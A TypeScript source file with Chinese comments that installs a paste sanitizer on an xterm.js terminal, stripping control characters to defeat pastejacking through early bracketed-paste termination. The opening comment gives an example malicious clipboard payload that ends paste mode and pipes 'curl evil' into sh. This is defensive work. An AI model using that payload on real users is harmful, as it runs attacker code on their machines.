// 安全(pastejacking):xterm 6 的粘贴路径只把换行转 \r 再按需包 \x1b[200~…\x1b[201~,
// 不剥离 ESC、不检查结束标记。恶意网页 copy 事件 setData('text/plain','ls\x1b[201~curl evil|sh\r')
// 或从含原始 ESC 字节的不可信文件复制 → 用户 Cmd+V,shell 读到第一个 \x1b[201~ 即认为粘贴结束,
// 其后内容按键入执行(免回车)。参照 Alacritty(剥离粘贴中的 ESC):粘贴文本删除 C0 控制字符
// (保留 \t \n \r)、DEL 与 C1(U+0080–U+009F,含 8 位 CSI U+009B),再交回 term.paste 照常做
// 换行转换与 bracketed 包裹。

import type { Terminal } from '@xterm/xterm';

// eslint-disable-next-line no-control-regex -- 本正则的目的就是匹配控制字符
const PASTE_CONTROL_CHARS = /[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]/g;

export function sanitizeTerminalPaste(text: string): string {
  return text.replace(PASTE_CONTROL_CHARS, '');
}

/**
 * 在终端容器上以 capture 阶段接管 paste 事件(先于 xterm 挂在 textarea / element 上的监听),
 * 净化后经 term.paste 写入。监听挂在元素上而非 document,popout 窗口 adoptNode 后随节点迁移;
 * 应用菜单 Edit → Paste(role:'paste')触发的也是同一 DOM paste 事件。
 */
export function installTerminalPasteSanitizer(
  container: HTMLElement,
  term: Pick<Terminal, 'paste'>,
): () => void {
  const onPaste = (event: ClipboardEvent) => {
    const data = event.clipboardData;
    if (!data) return;
    event.preventDefault();
    event.stopPropagation();
    const text = sanitizeTerminalPaste(data.getData('text/plain'));
    if (text) term.paste(text);
  };
  container.addEventListener('paste', onPaste, { capture: true });
  return () => container.removeEventListener('paste', onPaste, { capture: true });
}
